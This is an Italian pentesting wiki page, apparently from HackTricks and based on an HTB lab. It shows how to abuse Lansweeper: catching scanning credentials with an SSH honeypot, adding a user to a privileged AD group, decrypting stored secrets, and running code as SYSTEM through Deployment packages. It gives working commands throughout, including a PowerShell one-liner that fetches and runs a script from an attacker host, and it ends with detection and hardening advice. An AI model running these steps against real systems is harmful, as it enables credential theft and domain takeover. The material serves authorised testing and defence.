# Abuso di Lansweeper: raccolta di credenziali, decrittografia dei secrets e RCE tramite Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper è una piattaforma per la discovery e l'inventario degli asset IT, comunemente distribuita su Windows e integrata con Active Directory. Le credenziali configurate in Lansweeper vengono utilizzate dai suoi motori di scansione per autenticarsi agli asset tramite protocolli come SSH, SMB/WMI e WinRM. Le configurazioni errate consentono frequentemente:

- L'intercettazione delle credenziali reindirizzando un target di scansione verso un host controllato dall'attaccante (honeypot)
- L'abuso delle ACL di AD esposte dai gruppi correlati a Lansweeper per ottenere l'accesso remoto
- La decrittografia on-host dei secrets configurati in Lansweeper (connection strings e credenziali di scansione memorizzate)
- L'esecuzione di codice sugli endpoint gestiti tramite la funzionalità Deployment (spesso eseguita come SYSTEM)

Questa pagina riassume workflow e comandi pratici dell'attaccante per abusare di questi comportamenti durante gli engagement.

## 1) Raccolta delle credenziali di scansione tramite honeypot (esempio SSH)

Idea: creare un Scanning Target che punti al proprio host e associargli le Scanning Credentials esistenti. Quando viene eseguita la scansione, Lansweeper tenterà di autenticarsi con tali credenziali e l'honeypot catturerà le credenziali.<sup>[[1]](#references)</sup>

Panoramica dei passaggi (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (o Single IP) = il proprio IP VPN
- Configurare la porta SSH su una porta raggiungibile (ad esempio 2022 se la 22 è bloccata)
- Disabilitare la pianificazione e prevedere l'avvio manuale
- Scanning → Scanning Credentials → assicurarsi che esistano credenziali Linux/SSH; associarle al nuovo target (abilitare tutte quelle necessarie)
- Fare clic su “Scan now” nel target
- Eseguire un honeypot SSH e recuperare username/password tentati

Esempio con sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Convalida le credenziali acquisite sui servizi del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Note
- Gli altri protocolli non sono equivalenti: un listener SMB/WinRM normalmente ottiene una challenge-response NTLM anziché una password in chiaro. Il cracking o il relay dipendono dalle protezioni del protocollo negoziato; vedere [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). L'autenticazione SSH tramite password è solitamente il caso più semplice in chiaro.
- L'autenticazione SSH tramite chiave pubblica espone al server lo username e l'impronta della chiave pubblica, **non** la chiave privata né la relativa passphrase. Recuperare le credenziali basate su chiavi dal server Lansweeper compromesso invece di aspettarsi che un honeypot le divulghi.<sup>[[2]](#references)</sup>
- Molti scanner si identificano con banner client distinti (ad esempio, RebexSSH) e tenteranno comandi innocui (uname, whoami, ecc.).

### L'ordine di selezione delle credenziali è importante

Per una nuova scansione, Lansweeper riprova innanzitutto la credenziale che ha avuto successo per ultima per quell'asset, poi le credenziali mappate esplicitamente nel loro ordine configurato e infine la credenziale globale dello stesso tipo. Un honeypot che accetta la prima autenticazione tramite password normalmente quindi non osserverà le credenziali di fallback successive; durante una valutazione autorizzata del percorso delle credenziali, registrare e rifiutare i tentativi se l'obiettivo è verificare l'intera sequenza di fallback.<sup>[[6]](#references)</sup>

## 2) Abuso delle ACL AD: ottenere accesso remoto aggiungendosi a un gruppo app-admin

Usare BloodHound per enumerare i diritti effettivi dell'account compromesso. Un risultato comune è un gruppo specifico dello scanner o dell'app (ad esempio, “Lansweeper Discovery”) che dispone di GenericAll su un gruppo privilegiato (ad esempio, “Lansweeper Admins”). Se il gruppo privilegiato è anche membro di “Remote Management Users”, WinRM diventa disponibile non appena ci aggiungiamo.<sup>[[1]](#references)[[5]](#references)</sup>

Esempi di raccolta:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Sfruttare GenericAll su un gruppo con BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Quindi ottieni una shell interattiva:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Suggerimento: le operazioni Kerberos sono sensibili al tempo. Se riscontri KRB_AP_ERR_SKEW, sincronizzati prima con il DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrittografare i secrets configurati da Lansweeper sull'host

Sul server Lansweeper, il sito ASP.NET memorizza in genere una stringa di connessione crittografata e una chiave simmetrica utilizzata dall'applicazione. Con un accesso locale appropriato, è possibile decrittografare la stringa di connessione al DB ed estrarre le credenziali di scanning memorizzate.<sup>[[1]](#references)</sup>

Posizioni tipiche:
- Configurazione Web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Chiave dell'applicazione: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usa SharpLansweeperDecrypt per automatizzare la decrittografia e il dumping delle credenziali memorizzate. Senza argomenti, l'eseguibile corrente decrittografa `web.config`, si connette al database ed esegue il dumping di tutte le credenziali di scanning configurate; `-e` supporta anche la decrittografia offline/manuale quando un valore crittografato e il file della chiave sono già disponibili:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
L’output previsto include i dettagli di connessione al DB e le credenziali di scansione in chiaro, come gli account Windows e Linux utilizzati nell’intera infrastruttura. Questi spesso dispongono di diritti locali elevati sugli host del dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Utilizza le credenziali Windows recuperate durante la scansione per l'accesso privilegiato:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

In qualità di membro di “Lansweeper Admins”, la web UI espone le sezioni Deployment e Configuration. In Deployment → Deployment packages, è possibile creare pacchetti che eseguono comandi arbitrari sugli asset target. Lansweeper utilizza una credenziale di scansione amministrativa per raggiungere il Task Scheduler e `C$` del target, quindi crea un task per il deployment. Quando il pacchetto utilizza la modalità di esecuzione **System Account**, il payload viene eseguito come `NT AUTHORITY\SYSTEM`; le altre modalità di esecuzione possono utilizzare la credenziale di scansione mappata o l'utente attualmente connesso, quindi è necessario verificare la modalità selezionata invece di presumere che sia SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Passaggi di alto livello:
- Creare un nuovo Deployment package che esegua una one-liner PowerShell o cmd (reverse shell, add-user, ecc.).
- Selezionare l'asset desiderato (ad esempio il DC/host su cui viene eseguito Lansweeper) e fare clic su Deploy/Run now.
- Ricevere la shell come SYSTEM.

Payload di esempio (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Le azioni di deployment sono rumorose e lasciano log in Lansweeper e nei log eventi di Windows. Usarle con giudizio.

### Artefatti del deployment e un secondo punto di esposizione delle credenziali

Lo scanner scrive il proprio eseguibile di deployment in `C:\Windows\LSDeployment` tramite `C$`. I file dei package vengono normalmente letti da `DefaultPackageShare$`, supportato da `C:\Program Files (x86)\Lansweeper\PackageShare`, oppure da una package share specifica per intervallo IP. È importante notare che Lansweeper documenta che la credenziale della package share viene memorizzata in **forma reversibilmente crittografata nel registro di ogni computer che riceve un deployment**. Considerate un endpoint gestito compromesso come un potenziale punto di divulgazione per quell'account della share e ispezionate la directory di deployment, la cronologia delle attività pianificate e le package share configurate durante la ricostruzione delle attività di Lansweeper.<sup>[[7]](#references)</sup>

## Rilevamento e hardening

- Limitare o rimuovere le enumerazioni SMB anonime. Monitorare il RID cycling e gli accessi anomali alle share di Lansweeper.
- Controlli in uscita: bloccare o limitare rigorosamente SSH/SMB/WinRM in uscita dagli host scanner. Generare alert sulle porte non standard (ad es., 2022) e sui client banner insoliti come Rebex.
- Proteggere `Website\\web.config` e `Key\\Encryption.txt`. Esternalizzare i secret in un vault e ruotarli in caso di esposizione. Considerare service account con privilegi minimi e gMSA dove possibile.
- Monitoraggio AD: generare alert sulle modifiche ai gruppi correlati a Lansweeper (ad es., “Lansweeper Admins”, “Remote Management Users”) e sulle modifiche ACL che assegnano GenericAll/Write membership a gruppi privilegiati.
- Verificare la creazione/modifica/esecuzione dei package di Deployment e correlare le nuove attività pianificate remote con scritture in `C:\Windows\LSDeployment`; generare alert sui package che avviano `cmd.exe`/`powershell.exe` o connessioni in uscita inattese.
- Concedere alle credenziali della package share solo il permesso **Read & Execute** e non riutilizzarle mai per l'amministrazione. Preferire, ove pratico, un inventario basato su agent: se tutti i computer vengono scansionati da un agent e il modulo di deployment non viene utilizzato, Lansweeper non richiede credenziali di scanning dei computer memorizzate.<sup>[[6]](#references)[[7]](#references)</sup>

## Argomenti correlati
- [Enumerazione SMB/LSA/SAMR e RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Autenticazione Kerberos e considerazioni sul clock skew](kerberos-authentication.md)
- [Analisi dei percorsi con BloodHound](bloodhound.md)
- [Utilizzo di WinRM e lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Abuso della scansione Lansweeper, delle ACL AD e dei secret per ottenere il controllo di un DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (honeypot SSH)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Creare e mappare le credenziali di scanning — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Requisiti del deployment — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
